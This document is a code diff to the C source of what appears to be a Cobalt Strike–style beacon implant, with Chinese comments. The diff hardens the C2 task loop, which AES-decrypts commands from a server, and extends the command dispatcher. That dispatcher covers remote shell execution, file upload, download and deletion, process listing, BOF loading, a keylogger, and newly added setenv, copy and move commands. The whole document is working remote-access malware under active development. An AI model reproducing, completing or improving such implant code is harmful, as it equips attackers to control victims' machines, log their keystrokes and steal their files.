@@ -32,6 +32,11 @@ VOID beacon_main() {
                 responseEncodeData = tmp;
                 responseEncodeData[responseSize] = '\0';
             }
+            else {
+                free(responseEncodeData);
+                responseEncodeData = NULL;
+                continue;
+            }
         }
 
         size_t responseDataLength = 0;
@@ -41,7 +46,7 @@ VOID beacon_main() {
         // 必须放个\0，不然后续 strlen 会出现错误
 
         // 确保为 16 的倍数，进行 AES 解密
-        if (responseDataLength > 16 && responseDataLength % 16 == 0) {
+        if (responseData && responseDataLength > 16 && responseDataLength % 16 == 0) {
             // 直接去掉 HMAC Hash，这里还没有未实现 Hash 校验
             size_t dataLength = responseDataLength;
             size_t middleDataLength = dataLength - 16; 
@@ -49,7 +54,7 @@ VOID beacon_main() {
             // 开始解密指令(AES CBC)
             unsigned char* key = AESRandaeskey;
 
-            size_t ivLength = strlen((char*)IV);
+            size_t ivLength = 16;
             size_t decryptAES_CBCdatalen;
             unsigned char* decryptAES_CBCdata = AesCBCDecrypt(responseData, key, middleDataLength, &decryptAES_CBCdatalen);
 
@@ -69,32 +74,35 @@ VOID beacon_main() {
                 // 指令数据大小计数
                 size_t executeCount = 0;
 
-                while (1) {
-                    if (bigEndianLenBytes <= 0) {
-                        break;
-                    }
-
+                while (bigEndianLenBytes > 0) {
                     int callbackType = 0;
-
-                    // 下面这三个参数都是数据包的三个字段
                     uint32_t commandType = 0;
                     size_t commandBuflen = 0;
                     unsigned char* commandBuf = NULL;
 
-                    // 每解析一个指令 bigEndianLenBytes 会减少一个对应指令的长度
                     commandBuf = parsePacket(decryptedBuf, &bigEndianLenBytes, &commandType, &commandBuflen, &executeCount);
+
                     if (commandBuf) {
                         executeCommand(commandBuf, commandType, commandBuflen);
+                        free(commandBuf);
+                        commandBuf = NULL;
+                    }
+                    else {
+                        break;
                     }
                 }
 
-                // 一次请求获取的全部指令的已经执行完毕 开始 free
                 free(decryptAES_CBCdata);
                 decryptAES_CBCdata = NULL;
             }
         }
+
+    SLEEP_NEXT:
+        if (responseEncodeData) { free(responseEncodeData); responseEncodeData = NULL; }
+
         Sleep(SleepTime);
     }
+
     free(cookie_header);
 }
 
@@ -103,7 +111,7 @@ int main() {
     return 0;
 }
 
- VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen) {
+VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen) {
     unsigned char* postMsg = NULL;  // 此参数用于 DataProcess
     size_t msgLength = 0;           // 此参数用于 DataProcess
     int callbackType = 0;           // 此参数用于 DataProcess 不能使用 DWORD 表示 必须有符号 
@@ -114,44 +122,56 @@ int main() {
         CmdChangSleepTimes(commandBuf);
         break;
     case CMD_TYPE_FILE_BROWSE:   // 1
-        callbackType = 22;
+        callbackType = CALLBACK_PENDING;
         postMsg = CmdFileBrowse(commandBuf, &msgLength);
         break;
     case CMD_TYPE_UPLOAD_START:  // 1
-        postMsg = CmdUpload(commandBuf, &commandBuflen, &msgLength, 1);
-        callbackType = 0;
+        postMsg = CmdUpload(commandBuf, commandBuflen, &msgLength, 1);
+        callbackType = CALLBACK_OUTPUT;
         break;
     case CMD_TYPE_UPLOAD_LOOP:   // 1
-        postMsg = CmdUpload(commandBuf, &commandBuflen, &msgLength, 2);
-        callbackType = 0;
+        postMsg = CmdUpload(commandBuf, commandBuflen, &msgLength, 2);
+        callbackType = CALLBACK_OUTPUT;
         break;
     case  CMD_TYPE_DRIVES:       // 1
-        callbackType = 22;
+        callbackType = CALLBACK_PENDING;
         postMsg = CmdDrives(commandBuf, &msgLength);
         break;
     case  CMD_TYPE_MKDIR:        // 1 
-        callbackType = 0;
-        postMsg = CmdMkdir(commandBuf, &commandBuflen, &msgLength);
+        callbackType = CALLBACK_OUTPUT;
+        postMsg = CmdMkdir(commandBuf, commandBuflen, &msgLength);
         break;
     case CMD_TYPE_PWD:           // 1
-        callbackType = 0;
+        callbackType = CALLBACK_PWD;
         postMsg = CmdPwd(commandBuf, &msgLength);
         break;
     case CMD_TYPE_GETUID:        //1
-        callbackType = 0;
+        callbackType = CALLBACK_OUTPUT;
         postMsg = CmdGetUid(commandBuf, &msgLength);
         break;
+    case CMD_TYPE_SETENV:
+        callbackType = CALLBACK_OUTPUT;
+        postMsg = CmdSetEnv(commandBuf, commandBuflen, &msgLength);
+        break;
     case CMD_TYPE_RM:            // 1
-        callbackType = 0;
-        postMsg = CmdFileRemove(commandBuf, &commandBuflen, &msgLength);
+        callbackType = CALLBACK_OUTPUT;
+        postMsg = CmdFileRemove(commandBuf, commandBuflen, &msgLength);
+        break;
+    case CMD_TYPE_CP:            // 1
+		callbackType = CALLBACK_OUTPUT;
+		postMsg = CmdFileCopy(commandBuf, commandBuflen, &msgLength);
+		break;
+    case CMD_TYPE_MV:
+        callbackType = CALLBACK_OUTPUT;
+        postMsg = CmdFileMove(commandBuf, commandBuflen, &msgLength);
         break;
     case CMD_TYPE_DOWNLOAD:      // 1
         callbackType = -1;
-        CmdFileDownload(commandBuf, &commandBuflen, &msgLength);
+        CmdFileDownload(commandBuf, commandBuflen, &msgLength);
         break;
-    case CMD_TYPE_SHELL:
+    case CMD_TYPE_SHELL:         // 1
         callbackType = -1;
-        CmdShell(commandBuf, &commandBuflen);
+        CmdShell(commandBuf, commandBuflen);
 		// 因为 CmdShell 中会创建线程，线程中会使用 commanfBuf
 		// 线程结束后会自动释放 commanfBuf
 		// 如果提前释放 commanfBuf 会导致线程访问已释放内存
@@ -164,30 +184,26 @@ int main() {
         callbackType = -1;
         beacon_JobKill(commandBuf, &msgLength);;
         break;
-    case CMD_TYPE_BOF:  // 1
+    case CMD_TYPE_BOF:   // 1
         callbackType = -1;
-        CmdBeaconBof(commandBuf, &commandBuflen);
+        CmdBeaconBof(commandBuf, commandBuflen);
         break;
-    case CMD_TYPE_EXIT: // 1
+    case CMD_TYPE_EXIT:  // 1
         exit(-1);
     case CMD_TYPE_PIPE:
         callbackType = -1;
         PipeJob(commandBuf, &commandBuflen, &msgLength);
         break;
-    case CMD_TYPE_PS:  // 1
+    case CMD_TYPE_PS:    // 1
         callbackType = -1;
-        CmdPs(commandBuf, &commandBuflen);
-        break;
-    case CMD_TYPE_SPAWN_X64:
-        callbackType = -1;
-        exit(-1);
+        CmdPs(commandBuf, commandBuflen);
         break;
     case CMD_TYPE_KEYLOGGER:
         callbackType = -1;
         KEYLOGGEJob(0, commandBuf, &commandBuflen, 1);
         break;
     default:
-        callbackType = 0;
+        callbackType = CALLBACK_OUTPUT;
         unsigned char* result = "[-] This Command Not Accomplish";
         unsigned char* resultMemmory = (unsigned char*)malloc(strlen(result) + 1);
         if (!resultMemmory) {
@@ -200,8 +216,6 @@ int main() {
 		postMsg[msgLength] = '\0';
         break;
     }
-
-    free(commandBuf);
 
     if (callbackType >= 0 && postMsg) {
         DataProcess(postMsg, msgLength, callbackType);
